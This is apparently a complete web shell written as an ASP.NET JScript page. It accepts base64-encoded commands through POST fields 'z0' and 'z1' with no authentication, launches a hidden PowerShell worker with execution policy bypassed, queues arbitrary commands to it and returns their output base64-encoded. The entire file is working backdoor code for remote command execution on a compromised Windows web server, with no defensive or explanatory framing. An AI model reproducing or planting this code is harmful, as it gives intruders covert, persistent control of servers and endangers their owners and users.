<%

Response.ContentType = "application/json";
Response.Charset = "UTF-8";

var workDir = Server.MapPath(".");
var queueDir = System.IO.Path.Combine(workDir, ".queue");
var outFile = System.IO.Path.Combine(workDir, ".output.txt");
var pidFile = System.IO.Path.Combine(workDir, ".pid.txt");

if (!System.IO.Directory.Exists(queueDir)) {
    System.IO.Directory.CreateDirectory(queueDir);
}

function base64Decode(str, encodingName) {
    if (!str || str == "" || str == "undefined") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        var enc = encodingName 
            ? System.Text.Encoding.GetEncoding(encodingName) 
            : System.Text.Encoding.UTF8;
        return enc.GetString(bytes);
    } catch(e) {
        return str;
    }
}

function getTimestamp() {
    var d = new Date();
    var pad = function(n) { return (n < 10 ? "0" : "") + n; };
    return d.getFullYear() + pad(d.getMonth() + 1) + pad(d.getDate()) + "_" + 
           pad(d.getHours()) + pad(d.getMinutes()) + pad(d.getSeconds());
}

var actionType = base64Decode(String(Request.Form("z0")), null);
var rawZ1 = base64Decode(String(Request.Form("z1")), null);

if (actionType === "create") {
    if (System.IO.File.Exists(outFile)) {
        try { System.IO.File.Delete(outFile); } catch(e){}
    }
    
    var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + workDir + "\\worker.ps1\" \"" + workDir + "\"";
    
    var psi = new System.Diagnostics.ProcessStartInfo("C:\\Windows\\System32\\cmd.exe");
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = false; 
    psi.RedirectStandardError = false;
    psi.CreateNoWindow = true;          
    psi.Arguments = "/c " + cmd;
    
    var proc = new System.Diagnostics.Process();
    proc.StartInfo = psi;
    proc.Start();
    
    Response.Write('{"status":"success","msg":"PowerShell Engine spawned successfully."}');

} else if (actionType === "write") {
    var rawCmd = base64Decode(rawZ1, null);
    if (!/\r\n$/.test(rawCmd) && !/\n$/.test(rawCmd) && !/\r$/.test(rawCmd)) {
        rawCmd += "\r\n";
    }
    
    var randNum = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
    var path = System.IO.Path.Combine(queueDir, getTimestamp() + "_" + randNum + ".txt");
    
    System.IO.File.WriteAllText(path, rawCmd, System.Text.Encoding.UTF8);
    
    Response.Write('{"status":"success","msg":"Input buffer queued."}');

} else if (actionType === "read") {
    var readContent = "";
    var b64Out = "";
    
    if (System.IO.File.Exists(outFile)) {
        try {
            readContent = System.IO.File.ReadAllText(outFile, System.Text.Encoding.UTF8);
            
            if (readContent != "") {
                System.IO.File.WriteAllText(outFile, "", System.Text.Encoding.UTF8);
                
                var bytesOut = System.Text.Encoding.UTF8.GetBytes(readContent);
                b64Out = System.Convert.ToBase64String(bytesOut);
            }
        } catch(e) {
            
        }
    }
    
    Response.Write('{"status":"success","msg":"' + b64Out + '"}');

} else if (actionType === "stop") {
    try {
        System.IO.File.WriteAllText(pidFile, "stopped", System.Text.Encoding.UTF8);
    } catch(e){}
    
    Response.Write('{"status":"stop","msg":"Engine shutdown initiated."}');
} else {
    Response.Write('{"status":"fail","msg":"invalid action"}');
}

%>